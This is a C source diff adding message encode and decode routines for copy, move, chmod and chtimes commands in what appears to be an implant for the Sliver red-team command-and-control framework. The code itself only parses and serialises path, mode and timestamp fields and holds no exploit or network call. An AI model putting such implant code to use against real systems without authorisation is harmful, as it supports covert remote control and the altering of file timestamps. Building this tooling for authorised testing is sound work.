@@ -1067,3 +1067,130 @@ int sliver_current_token_owner_encode(sliver_buf_t *out, const char *who) {
   }
   return sliver_buf_put_tag(out, 9, 2) == 0 && sliver_buf_put_varint(out, 0) == 0 ? 0 : -1;
 }
+
+/* --- Cp / Mv / Chmod / Chtimes ----------------------------------------- */
+
+int sliver_src_dst_decode(const void *data, size_t len, char *src, size_t src_cap, char *dst,
+                          size_t dst_cap) {
+  sliver_reader_t r;
+  uint32_t field, wire;
+  int rc;
+
+  if (src == NULL || dst == NULL || src_cap == 0 || dst_cap == 0) {
+    return -1;
+  }
+  src[0] = 0;
+  dst[0] = 0;
+  sliver_reader_init(&r, data, len);
+  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
+    if (field == 1 && wire == 2) {
+      if (sliver_reader_string(&r, src, src_cap) != 0) {
+        return -1;
+      }
+    } else if (field == 2 && wire == 2) {
+      if (sliver_reader_string(&r, dst, dst_cap) != 0) {
+        return -1;
+      }
+    } else if (sliver_reader_skip(&r, wire) != 0) {
+      return -1;
+    }
+  }
+  return rc == 1 ? 0 : -1;
+}
+
+int sliver_cp_encode(sliver_buf_t *out, const char *src, const char *dst, int64_t written,
+                     const char *err) {
+  if (out == NULL) {
+    return -1;
+  }
+  if (sliver_buf_put_string(out, 1, src != NULL ? src : "") != 0 ||
+      sliver_buf_put_string(out, 2, dst != NULL ? dst : "") != 0 ||
+      sliver_buf_put_int64(out, 3, written) != 0) {
+    return -1;
+  }
+  return encode_response(out, err);
+}
+
+int sliver_mv_encode(sliver_buf_t *out, const char *src, const char *dst, const char *err) {
+  if (out == NULL) {
+    return -1;
+  }
+  if (sliver_buf_put_string(out, 1, src != NULL ? src : "") != 0 ||
+      sliver_buf_put_string(out, 2, dst != NULL ? dst : "") != 0) {
+    return -1;
+  }
+  return encode_response(out, err);
+}
+
+int sliver_chmod_req_decode(const void *data, size_t len, char *path, size_t path_cap,
+                            char *mode, size_t mode_cap, int *recursive) {
+  sliver_reader_t r;
+  uint32_t field, wire;
+  int rc;
+
+  if (path == NULL || mode == NULL || path_cap == 0 || mode_cap == 0) {
+    return -1;
+  }
+  path[0] = 0;
+  mode[0] = 0;
+  if (recursive != NULL) {
+    *recursive = 0;
+  }
+  sliver_reader_init(&r, data, len);
+  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
+    if (field == 1 && wire == 2) {
+      if (sliver_reader_string(&r, path, path_cap) != 0) {
+        return -1;
+      }
+    } else if (field == 2 && wire == 2) {
+      if (sliver_reader_string(&r, mode, mode_cap) != 0) {
+        return -1;
+      }
+    } else if (field == 3 && wire == 0) {
+      uint64_t v;
+      if (sliver_reader_varint(&r, &v) != 0) {
+        return -1;
+      }
+      if (recursive != NULL) {
+        *recursive = v != 0;
+      }
+    } else if (sliver_reader_skip(&r, wire) != 0) {
+      return -1;
+    }
+  }
+  return rc == 1 ? 0 : -1;
+}
+
+int sliver_chtimes_req_decode(const void *data, size_t len, char *path, size_t path_cap,
+                              int64_t *atime, int64_t *mtime) {
+  sliver_reader_t r;
+  uint32_t field, wire;
+  int rc;
+
+  if (path == NULL || path_cap == 0) {
+    return -1;
+  }
+  path[0] = 0;
+  sliver_reader_init(&r, data, len);
+  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
+    if (field == 1 && wire == 2) {
+      if (sliver_reader_string(&r, path, path_cap) != 0) {
+        return -1;
+      }
+    } else if ((field == 2 || field == 3) && wire == 0) {
+      uint64_t v;
+      if (sliver_reader_varint(&r, &v) != 0) {
+        return -1;
+      }
+      if (field == 2 && atime != NULL) {
+        *atime = (int64_t)v;
+      }
+      if (field == 3 && mtime != NULL) {
+        *mtime = (int64_t)v;
+      }
+    } else if (sliver_reader_skip(&r, wire) != 0) {
+      return -1;
+    }
+  }
+  return rc == 1 ? 0 : -1;
+}
